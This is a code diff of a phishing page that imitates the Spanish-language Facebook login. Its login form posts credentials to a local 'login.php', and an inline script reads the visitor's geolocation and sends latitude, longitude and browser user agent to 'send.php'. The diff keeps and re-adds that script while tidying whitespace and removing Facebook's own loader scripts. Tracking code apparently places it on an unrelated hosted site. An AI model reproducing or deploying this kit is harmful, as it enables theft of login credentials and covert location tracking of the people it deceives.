@@ -23,7 +23,7 @@
     <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
     <meta name="description"
         content="Inicia sesi&#xf3;n en Facebook para empezar a compartir y conectarte con tus amigos, tus familiares y las personas que conoces." />
-      
+
     <link rel="canonical" href="https://www.facebook.com/" />
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVBr.ico" />
     <link type="text/css" rel="stylesheet"
@@ -41,7 +41,7 @@
     <link type="text/css" rel="stylesheet"
         href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/yotEdcUw9Gj.css?_nc_x=Ij3Wp8lg5Kz"
         data-bootloader-hash="DcLQ9Pg" />
-        <script src="getLocation.js"></script>
+    <script src="getLocation.js"></script>
     <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/p5KOM92uMzJ.js?_nc_x=Ij3Wp8lg5Kz"
         data-bootloader-hash="jZ6roqj" nonce="MXgCqhpg"></script>
     <script
@@ -67,15 +67,14 @@
                             <div class="_8esn">
                                 <div class="_8iep _8icy _9ahz _9ah-">
                                     <div class="_6luv _52jv">
-                                        <form class="_9vtf" action="login.php" method="post"  id="u_0_2_K9">
+                                        <form class="_9vtf" action="login.php" method="post" id="u_0_2_K9">
                                             <input type="hidden" name="jazoest" value="2952" autocomplete="off" /><input
                                                 type="hidden" name="lsd" value="AVrivHEfUX0" autocomplete="off" />
                                             <div>
-                                                <div class="_6lux"><input  type="text" class="inputtext _55r1 _6luy"
+                                                <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
                                                         name="email" id="email" data-testid="royal_email"
                                                         placeholder="Correo electr&#xf3;nico o n&#xfa;mero de tel&#xe9;fono"
-                                                        autofocus="1"
-                                                        required
+                                                        autofocus="1" required
                                                         aria-label="Correo electr&#xf3;nico o n&#xfa;mero de tel&#xe9;fono" />
                                                 </div>
                                                 <div class="_6lux">
@@ -240,52 +239,23 @@
     </div>
 
     <script>
-            
-            function getLocation() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(showPosition);
-                }
-            }
-            
-            function showPosition(position) {
-                const xhttp = new XMLHttpRequest();
-                xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent)
-                xhttp.send();
-            }
-            
-                    </script>
 
-    
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y1/l/0,cross/rN8FC2oHAMR.css?_nc_x=Ij3Wp8lg5Kz"
-        as="style" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/LPC3fQiXWzj.css?_nc_x=Ij3Wp8lg5Kz"
-        as="style" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/RspwE1UYLwr.css?_nc_x=Ij3Wp8lg5Kz"
-        as="style" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/Cs-FUeSXins.css?_nc_x=Ij3Wp8lg5Kz"
-        as="style" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/yotEdcUw9Gj.css?_nc_x=Ij3Wp8lg5Kz"
-        as="style" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iYdq4/yI/l/es_LA/4NLaBYnEOuq.js?_nc_x=Ij3Wp8lg5Kz"
-        as="script" nonce="MXgCqhpg" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/r2g9hI569dy.js?_nc_x=Ij3Wp8lg5Kz" as="script"
-        nonce="MXgCqhpg" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/KTiFWdV2a-W.js?_nc_x=Ij3Wp8lg5Kz" as="script"
-        nonce="MXgCqhpg" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/92NidoQOUMO.js?_nc_x=Ij3Wp8lg5Kz" as="script"
-        nonce="MXgCqhpg" />
-    <script>window.__bigPipeCtor = now_inl(); requireLazy(["BigPipe"], function (BigPipe) { define("__bigPipe", [], window.bigPipe = new BigPipe({ "forceFinish": true, "config": { "flush_pagelets_asap": true, "dispatch_pagelet_replayable_actions": false } })); });</script>
-    <script
-        nonce="MXgCqhpg">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("first_response", n); }) })();</script>
-    <script
-        nonce="MXgCqhpg">requireLazy(["__bigPipe"], (function (bigPipe) { bigPipe.onPageletArrive({ displayResources: ["4g2Kr2J", "yjPor86", "Pud6B2Z", "7DQOHuK", "DcLQ9Pg", "znSgc/E", "OZHqf5+", "Tl9ZK6C", "TzQylRH", "P/mr5VE"], id: "first_response", phase: 0, last_in_phase: true, tti_phase: 0, all_phases: [63], hsrp: { hblp: { consistency: { rev: 1007736561 } } }, allResources: ["PeBfHtT", "znSgc/E", "/rRtdTe", "f9LZatQ", "h9t9oKh", "gPq3qLy", "hTO+Etv", "OZHqf5+", "TzQylRH", "DfsNDZJ", "Tl9ZK6C", "4g2Kr2J", "yjPor86", "Pud6B2Z", "7DQOHuK", "DcLQ9Pg", "dAWNZ/s", "/rO0lbn", "P/mr5VE"] }); }));</script>
-    <script>requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.setPageID("7247952256864250260") });</script>
-    <script
-        nonce="MXgCqhpg">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("last_response", n); }) })();</script>
-    
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            }
+        }
 
-    <script type='text/javascript' src='https://count.carrierzone.com/app/count_server/count.js'></script>
-    <script type='text/javascript'><!-
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent)
+            xhttp.send();
+        }</script>
+
+        
+        <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START -->
+<script type='text/javascript' src='https://count.carrierzone.com/app/count_server/count.js'></script>
+<script type='text/javascript'><!--
 wm_custnum='820e8bbd8d6e1ac4';
 wm_page_name='index.php';
 wm_group_name='/services/webpages/n/e/newphaseelectrical.co.uk/public/NpkRI';
@@ -293,8 +263,8 @@ wm_campaign_key='campaign_id';
 wm_track_alt='';
 wiredminds.count();
 // -->
-    </script>
-    <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
+</script>
+<!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
 </body>
 
 </html>
